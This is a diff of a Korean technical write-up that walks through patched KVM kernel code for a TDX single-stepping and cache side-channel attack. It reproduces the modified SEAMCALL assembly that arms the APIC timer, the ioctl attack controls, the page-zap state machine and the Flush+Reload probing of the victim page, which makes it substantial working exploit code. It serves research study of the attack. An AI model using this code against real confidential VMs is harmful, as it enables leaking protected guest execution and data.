@@ -709,7 +709,7 @@ static noinstr void tdx_vcpu_enter_exit(struct vcpu_tdx *tdx)
 	guest_state_exit_irqoff();
 }
 ```
-시그니처에서 `noinstr`는 instrumentation을 하지 말라는 것을 나타냅니다. 인자는 `vcpu_tdx`입니다. TD 한 사이클의 SEAMCALL 호출을 맡습니다. 게스트 GPR(General Purpose Registers)은 **게스트가 실행 중에 쓰는 CPU 레지스터 값** 을 의미합니다. 게스트에서 호스트로 전환 될 때는 **CPU 레지스터 값을 메모리(vcpu->arch.regs[])에** 넣어두고, 호스트에서 게스트로 전환할 때는 **메모리에서 레지스터 값을 꺼내 CPU 레지스터에** 넣습니다. 일단 VMXdㅔ서는 KVM이 직접 어셈블리로 CPU 레지스터에 로드를 하는데, TDX는 그렇게 할 수 없으니 **TDX module에게 전달** 하면서 게스트 레지스터에 로드할 수 있게 합니다. 참고로 오고 가는 GPR 개수에 따라 호출하는 API가 달라집니다.
+시그니처에서 `noinstr`는 instrumentation을 하지 말라는 것을 나타냅니다. 인자는 `vcpu_tdx`입니다. TD 한 사이클의 SEAMCALL 호출을 맡습니다. 게스트 GPR(General Purpose Registers)은 **게스트가 실행 중에 쓰는 CPU 레지스터 값** 을 의미합니다. 게스트에서 호스트로 전환 될 때는 **CPU 레지스터 값을 메모리(vcpu->arch.regs[])에** 넣어두고, 호스트에서 게스트로 전환할 때는 **메모리에서 레지스터 값을 꺼내 CPU 레지스터에** 넣습니다. 일단 VMX에서는 KVM이 직접 어셈블리로 CPU 레지스터에 로드를 하는데, TDX는 그렇게 할 수 없으니 **TDX module에게 전달** 하면서 게스트 레지스터에 로드할 수 있게 합니다. 참고로 오고 가는 GPR 개수에 따라 호출하는 API가 달라집니다.
 
 ```c
 u64 __seamcall(u64 fn, struct tdx_module_args *args);            // 단순 SEAMCALL (RAX status만 주고 받기)
@@ -768,21 +768,257 @@ SYM_FUNC_START(__seamcall_saved_ret_tdxstep)
 SYM_FUNC_END(__seamcall_saved_ret_tdxstep)
 EXPORT_SYMBOL_GPL(__seamcall_saved_ret_tdxstep)
 ```
-새로 추가된 파라미터는 `tdxstep`으로 tdxstep=1이면 공격하는 것을 나타냅니다. 그리고 기존 레지스터 중 사용하지 않던 두 레지스터 rdx, rcx를 이용하여 추가 정보를 전달합니다. 
+새로 추가된 파라미터는 `tdxstep`으로 tdxstep=1이면 공격하는 것을 나타냅니다. 그리고 기존 레지스터 중 사용하지 않던 두 레지스터 rdx, rcx를 이용하여 추가 정보를 전달합니다. 함수 호출 규약에 따라 3번째, 4번재 인자를 통해 값을 전달합니다. 
 - rdx: `timings` - 호출자가 미리 할당한 배열의 포인터로, 인덱스 0에는 seamcall 직후 읽은 rdtsc값, 1에는 MSR에 쓴 deadline 값이 들어갑니다. 
 - rcx: `apic_tsc_offset` - APIC 타이머를 언제 발사시킬지 결정하는 단방향 설정값으로, nonzero라면 `rdtsc() + apic_tsc_offset`을 계산하여 **MSR_IA32_TSC_DEALINE** 에 기록함으로써 TSC-dealine 모드로 미리 설정된 APIC 타이머를 장전합니다. 
 
+```
+.if \tdxstep /*This n */
+
+	/* we can already load these registers here as we don't clobber them. Remaining register will be loaded later*/
+	movq	TDX_MODULE_r9(%rsi), %r9
+	movq	TDX_MODULE_r10(%rsi), %r10
+	movq	TDX_MODULE_r11(%rsi), %r11
+
+	/*save @timings array for late. Make sure that this is 
+	at the top of the stack after the seamcall*/
+	push %rcx
+
+	/*rax is free to use at this point. Load @apic_tsc_offset*/
+	movq %r8, %rax
+	/*program apic timer if @apic_tsc_offset is nonzero*/
+	test %rax, %rax
+	jz skip_apic_tsc_init
+
+	/*required for wmsr to tsc deadline msr. See e.g. arch/x86/kernel/apic/apic.c:489 or Sec 11.5.4.1 in Intel SDM*/
+	mfence
+
+	/*compute rdtsc() + @apic_tsc_offset and store it in %r8*/
+	rdtsc
+	shl $32, %rdx
+	or %rdx, %rax
+	add %rax, %r8
+
+	/*store value in @timings[1]*/
+	mov %r8, 8(%rcx)
 
 
-### APIC export
+	/*wrmsr: Write the value in EDX:EAX to MSR specified by ECX*/
+	/*only keep uper 32 bitsof %r8 in rax*/
+	mov %r8, %rdx
+	shr $32, %rdx
+	/*upper bits are ignored/cleared when rax is accessed as rdx*/
+	mov %r8, %rax
+	/*MSR_IA32_TSC_DEADLINE*/
+	mov $0x6E0, %ecx
+	wrmsr
 
-### ioctl 진입점 + 전역 config
+	/*N.B. at this point @timings array ptr need to be on top of stack*/
 
-### SEAMCALL 패스 (TD enter/exit)
+skip_apic_tsc_init:
 
-### 페이지 폴트 패스
+	/*load remaining registers*/
+	/* Move Leaf ID to RAX */
+	mov %rdi, %rax
+	/* Move other input regs from 'struct tdx_module_args' */
+	movq	TDX_MODULE_rcx(%rsi), %rcx
+	movq	TDX_MODULE_rdx(%rsi), %rdx
+	movq	TDX_MODULE_r8(%rsi), %r8
 
-### teardown
+
+.endif /* tdxstep */
+```
+패치를 통해 `tdxcall.S`에 새로 추가된 공격 코드입니다. seamcall 직전에 **정상 SEAMALL 인자를 준비** 하고, **APIC 타이머를 arm** 하는 부분입니다. 그 후에는 vicitm 코드 페이지 안의 **64개 cache line 각각에 대해 Reload + latency 측정을 수행** 하고 결과를 timings에 기록합니다. 호스트에서 이 결과를 통해 zero step을 걸러냅니다.
+
+### ioctl 진입점 + 전역 config, kvm_main.c
+kvm_main.c에 적용된 패치를 보면, 헤더파일들을 추가한 후 **공격 대상 VM** 추적에 사용할 `main_vm` 전역 변수를 생성합니다. 
+
+#### kvm_dev_ioctl_create_vm
+```c
+main_vm = kvm;
+//Since this is a new VM, reset called_split_pages
+spin_lock(&tdx_step_config_lock);
+tdx_step_config.called_split_pages = false;
+spin_unlock(&tdx_step_config_lock);
+printk("setting main_vm to newly started vm\n");
+```
+`kvm_dev_ioctl_create_vm` 함수는 VM fd를 만들어 반환하는 함수입니다. 추가된 코드는 전역 변수 main_vm에 방금 만든 VM의 fd를 넣어 항상 `main_vm`만 보면 될 수 있도록 하였으며, `called_split_pages` 플래그를 리셋하여 VM에 대하여 다양한 크기의 페이지들을 4KB 페이지로 분할하도록 합니다. 
+
+#### kvm_dev_ioctl
+`kvm_dev_ioctl`은 **/dev/kvm 디바이스 파일의 ioctl 핸들러** 입니다. VM 생성, 특정 KVM 기능 지원 여부 확인 등에 이용이 되는데, 공격 코드는 `kvm_dev_ioctl`에 새로운 case를 추가하였습니다.
+
+```c
+case TDX_STEP_IS_FR_VMCS_DONE: {
+	tdx_step_is_fr_vmcs_done_t result;
+	char* name = "TDX_STEP_IS_FR_VMCS_DONE";
+
+	r = 0;
+
+	spin_lock(&tdx_step_config_lock);
+	result.is_done = (tdx_step_config.attack_cfg.state == AS_INACTIVE) && (tdx_step_config.attack_cfg.current_attack_iteration_idx >= (tdx_step_config.attack_cfg.want_attack_iterations-1));
+
+	result.remaining_timer_interrupts = tdx_step_config.attack_cfg.current_attack_iteration_idx;
+	result.attack_state = tdx_step_config.attack_cfg.state;
+	result.want_attack_iterations = tdx_step_config.attack_cfg.want_attack_iterations;
+	spin_unlock(&tdx_step_config_lock);
+
+	if( copy_to_user(argp, &result, sizeof(tdx_step_is_fr_vmcs_done_t))) {
+		printk("%s: failed to copy timings to user space\n", name);
+		r = -EINVAL;
+		goto out;
+	}
+	break;	
+}
+```
+공격 진행 상태를 반환하는 핸들러입니다. `is_done` 필드는 두 조건을 모두 만족해야 true를 반환하는데, 하나는 **state == AS_INACTIVE** 이고, 다른 하나는 **idx >= want - 1** 입니다. 백그라운드에서 비동기 진행 중인 공격의 상태를 유저 공간에서 polling 하여 확인할 수 있도록 하고, `is_done==true`가 반환되면 TERMINATE로 결과를 회수합니다.
+
+**TDX_STEP_TERMINATE_FR_VMCS ioctl** 은 공격 종료, 정리, 결과 회수를 담당합니다. 공유 메모리와 victim code의 매핑을 해제학고 F+R 모니터 스레드에 종료 신호를 보내고 대기합니다. 그 후, user params를 복사하고 공격 결과를 유저 공간으로 복사합니다. 
+
+**TDX_STEP_FR_VMCS ioctl** 은 공격 전체 셋업과 비동기 시작을 담당합니다. vCPU를 획득한 후 2MB huge page들을 4KB로 분할합니다. 2D event 배열을 할당하고 shared memory를 매핑합니다. 이후 trigger sequence와 attack_phase_allowed_gpas를 user space에서 복사하고, 마지막으로 tdx_step_config 전역 구조체에 모든 설정값을 적용한 후 state를 **AS_SETUP_PENDING으로 전환** 해 공격을 시작합니다. 함수는 즉시 반환되며, 실제 공격은 다음 tdx_vcpu_enter_exit 사이클부터 vcpu thread가 state를 보고 비동기로 수행합니다.
+
+### AS_SETUP_PENDING -> AS_WAITING_FOR_TARGET (tdx.c)
+```c
+if (tdx_step_config.attack_cfg.state == AS_SETUP_PENDING) {
+	bool blocked_target;
+	uint64_t gfn = tdx_step_config.attack_cfg.target_trigger_sequence[0] >> 12;
+	if( tdx_step_config.attack_cfg.current_attack_iteration_idx == 0) {
+		tdx_step_config.attack_cfg.start_time = ktime_get_ns();
+	}
+	TDXSTEP_LOG_DBG("calling my_zap_private_spte on first trigger sequence entry gfn  0x%llx\n", gfn);
+	blocked_target = my_tdx_sept_zap_private_spte(vcpu->kvm, gfn, PG_LEVEL_4K, true);
+	if (blocked_target) {
+		TDXSTEP_LOG_DBG("setting attack state to AS_WAITING_FOR_TARGET\n");
+		tdx_step_config.attack_cfg.state = AS_WAITING_FOR_TARGET;
+	} else {
+		TDXSTEP_LOG_DBG("failed to block target_gfn, setting state to AS_INACTIVE\n");
+		tdx_step_config.attack_cfg.state = AS_INACTIVE;
+	}
+}
+```
+공격 첫 진입 시 **trigger sequence 첫 페이지 zap** 을 하는 부분입니다. 
+
+```c
+if(tdx_step_config.attack_cfg.state == AS_WAITING_FOR_DONE_MARKER) {
+	spin_unlock(&tdx_step_config_lock);
+	attacker_apic = true;
+
+    //sync measurements only case
+	if( tdx_step_config.targeted_tdvps_addrs != NULL) {
+		uint64_t i;
+		for( i = 0; i < tdx_step_config.targeted_tdvps_addrs_len; i++) {
+			*((volatile uint64_t*)(tdx_step_config.targeted_tdvps_addrs[i]));
+		}
+	} else { //regular apic timer attack workflow
+		apic_backup(&tdx_step_config.apic_backup);
+		tdx_step_config.entries_while_active_stepping_attack += 1;
+		TDXSTEP_LOG_DBG("Starting apic timer attack\n");
+		if( !tdx_step_config.running_with_custom_apic_handler) {
+			TDXSTEP_LOG_DBG("Installing custom apic timer handler\n");
+			tdx_step_config.running_with_custom_apic_handler = true;
+
+			prev_rip = 0;
+		}
+		if(!tdx_step_config.attack_cfg.debug_mode) {
+			prepare_apic_timer();
+		} else {
+			printk("%s: debug mode, NOT calling prepare_apic_timer\n", __FUNCTION__);
+		}
+		if(!tdx_step_config.attack_cfg.debug_mode) {
+			if( tdx_step_config.attack_type == STUMBLE_STEP) {
+				tdx_flush_tlb(vcpu);
+				apic_tsc_offset = tdx_step_config.timer_value;
+			} else if( tdx_step_config.attack_type == FREQ_SNEAK ) {
+				tdx_flush_tlb_current(vcpu);
+				flushed_tlb = true;
+				apic_tsc_offset = tdx_step_config.timer_value;
+			}
+		} else {
+			printk("%s: debug mode, not doing attack type specific apic timer setup\n", __FUNCTION__);
+		}
+	
+	}
+
+	if( tdx_step_config.attack_type == STUMBLE_STEP ) {
+		*((volatile uint64_t*)tdx_step_config.attacked_tdvps_addr);
+	}
+
+	if( tdx_step_config.mapping_victim_code != NULL ) {
+		uint64_t offset;
+
+		for( offset = 0; offset < 4096; offset += 64) {
+			*((volatile uint64_t*)(tdx_step_config.mapping_victim_code+offset));
+		}
+	}
+}
+```
+trigger sequence를 다 따라가서 target에 도달하면 `AS_WAITING_FOR_DONE_MARKER` 상태로 전이합니다.  이 상태에서는 매 사이클 진입 직전에 APIC 원본 백업, TSC-deadline 모드 셋업(prepare_apic_timer), TLB flush, apic_tsc_offset 설정으로 APIC 타이머를 무장한 다음, victim 코드 페이지의 64개의 cache line을 모두 read 해서 Key-ID based F+R을 준비합니다.
+
+```c
+atomic_set(&tdx_step_inside_vm, attacker_apic);
+//spin_unlock(&tdx_step_inside_vm_lock);
+entry_time = rdtsc();
+
+vcpu->arch.regs[VCPU_REGS_RCX] = tdx->tdvpr_pa;
+tdx->exit_reason.full = __seamcall_saved_ret_tdxstep(
+	TDH_VP_ENTER, /*rdi*/
+	(struct tdx_module_args*)vcpu->arch.regs, /*rsi*/
+	timings, /*rdx*/
+	apic_tsc_offset /*rcx*/
+	);
+```
+이 단계에서는 전역 atomic 변수에 **지금 공격 사이클로 TD 진입 중** 표시를 한 다음, rdtsc를 통해 TD 진입 직전 호스트 TSC를 기록합니다. 호스트 TSC는 사후 분석과 검증에서 사용됩니다. **__seamcall_saved_ret_tdxstep** 을 호출하면 어셈블리 코드가 실행되면서 timer 무장, seamcall, single-step이 이뤄집니다. 
+
+```c
+if(attacker_apic) {
+	//if in debug mode, read RIP and compute delta to previously read value
+	if( to_kvm_tdx(vcpu->kvm)->attributes & TDX_TD_ATTRIBUTE_DEBUG) {
+		rip = td_vmcs_read64(tdx, GUEST_RIP);
+	}
+	if((rip==0) || (prev_rip == 0)) {
+		rip_delta = -1;
+	} else {
+		rip_delta = rip - prev_rip;
+	}
+	//if shared memory counter is used, read current value and compute delta to previously read value
+	if( tdx_step_config.mapping_shared_mem == NULL ) {
+		counter_value = 0;
+		counter_diff = - 1;
+	} else {
+		counter_value = *((volatile uint64_t*)tdx_step_config.mapping_shared_mem);
+		counter_diff = counter_value - prev_counter_value;
+	}	
+
+	switch (tdx_step_config.attack_type ) {
+	case FREQ_SNEAK:
+		if(!tdx_step_config.attack_cfg.debug_mode) {
+			if( analyze_freq_sneak_data(timings+3, rip, rip_delta, flushed_tlb, counter_diff) ) {
+			printk("%s:%d analyze_freq_sneak_data failed\n", __FUNCTION__, __LINE__);
+			}
+		} else {
+			printk("%s: debug mode, skipping analyze_freq_sneak_data\n", __FUNCTION__);
+		}
+		break;
+	}
+	prev_rip = rip;
+	prev_counter_value = counter_value;
+	tdx_step_config.attack_cfg.event_id += 1;
+}
+```
+공격 사이클을 사후 분석하는 단계입니다. `attacker_apic == true`일 때만 실행됩니다. debug mode TD면 이전 사이클과 비교하여 rip_delta를 계산합니다. 다음으로 shared memory counter delta를 계산합니다. TD 안의 victim 코드가 매 iteration마다 shared 페이지에 둔 카운터를 +1해두면, 호스트는 alias로 그 값을 직접 read해서 이전 사이클과 차이(counter_diff)를 구합니다. counter_diff = 1이 의도한 single-step, 0이면 zero-step, 큰 값이면 multi-step으로 판정 가능 — TD가 협조해야만 의미 있는 값이고 mapping_shared_mem == NULL이면 -1로 "데이터 없음" 표시합니다. 이어서 attack_type별 분기에서 FREQ_SNEAK이면 ★analyze_freq_sneak_data(timings+3, rip, rip_delta, flushed_tlb, counter_diff)★를 호출해 wrapper가 채운 cache latency 64개를 RIP/counter/TLB-flush 같은 보조 정보와 함께 묶어 하나의 event 객체로 가공한 후 **freq_sneak_events_by_iteration[current_iter][next_idx] 슬롯에 누적 저장** 합니다. 
+
+### 페이지 폴트 패스, kvm_tdp_mmu_map
+kvm_tdp_mmu_map 함수는 **TDX SEPT fault** 처리에서 매핑 결정과 SEAMCALL 트리거가 일어나는 최종 처리 지점으로, 모든 TD Private 메모리 접근의 페이지 폴트가 이 함수를 거치며, TDXDown은 여기에 상태 머신 훅을 추가하여 **모든 fault 정보에 대한 매핑, zap 결정** 을 합니다. TDP는 **Two-Dimensional Paging** 을 의미하며, CPU가 하드웨어로 GVA->GPA와 GPA->HPA(EPT/NPT) 두 단계를 자동 변환하는 가상화 페이지 테이블 메커니즘입니다. 
+
+```c
+if (((tdx_step_config.attack_cfg.state > AS_SETUP_PENDING) &&
+    (tdx_step_config.attack_cfg.state < AS_MAX))) {
+```
+이 함수에서는, 공격이 active한 상태일 때 공격 코드 루틴으로 진입합니다.
+
+```c
+if( (acfg->state == AS_WAITING_FOR_TARGET) && (fault->gfn ==(acfg->target_trigger_sequence[acfg->tts_idx] >> 12)) ) {
+```
+`AS_WAITING_FOR_TARGET`은 trigger sequence를 따라가는 중인 상태를 의미합니다. 조건문 블럭 안에서 trigger sequence를 하나씩 따라가면서 unzap-zap을 반복하고, target에 도달하면 **AS_WAITING_FOR_DONE_MARKER** 상태로 전이합니다. Target에 도달하면 `done_marker_gpa`를 zap하여 iteration 끝을 감지하는 trap을 설치합니다. 그 후 done_marker에 방문하면 모든 page tracking을 해제하고 state를 **AS_WAITING_FOR_END_OF_SEQ** 로 전이하고 singe-step 측정 phase를 종료합니다.
 
 ## 실제 세팅
 1. 6.8.0 canonical/intel 커널 소스코드 다운받기
